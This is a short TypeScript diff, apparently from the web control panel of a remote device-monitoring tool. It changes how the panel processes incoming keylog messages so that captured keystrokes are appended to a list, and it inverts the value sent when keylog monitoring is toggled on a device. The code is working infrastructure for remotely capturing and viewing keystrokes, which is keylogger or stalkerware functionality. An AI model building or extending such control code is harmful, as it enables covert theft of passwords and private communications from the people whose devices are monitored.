@@ -227,7 +227,13 @@ const handleMessage = (msg: WebSocketInboundMessage) => {
             deviceData.loading.value.apps = false;
             break;
         }
-        case 'klog':
+        case 'klog': {
+            const keylogMsg = msg as KeylogDataMessage;
+            const newEntries = parseKeylogData(keylogMsg.data);
+            keylogEntries.value = [...keylogEntries.value, ...newEntries];
+            deviceData.loading.value.keylog = false;
+            break;
+        }
         case 'klogsdate': {
             const keylogMsg = msg as KeylogDataMessage;
             keylogEntries.value = parseKeylogData(keylogMsg.data);
@@ -590,7 +596,7 @@ const handleToggleKeylogMonitor = () => {
         itype: 'slr_panelsend',
         subc: 'Keylog',
         pid: deviceId.value,
-        keylogtype: newState ? '1' : '0',
+        keylogtype: newState ? '0' : '1',
     });
     isKeylogMonitoring.value = newState;
 };
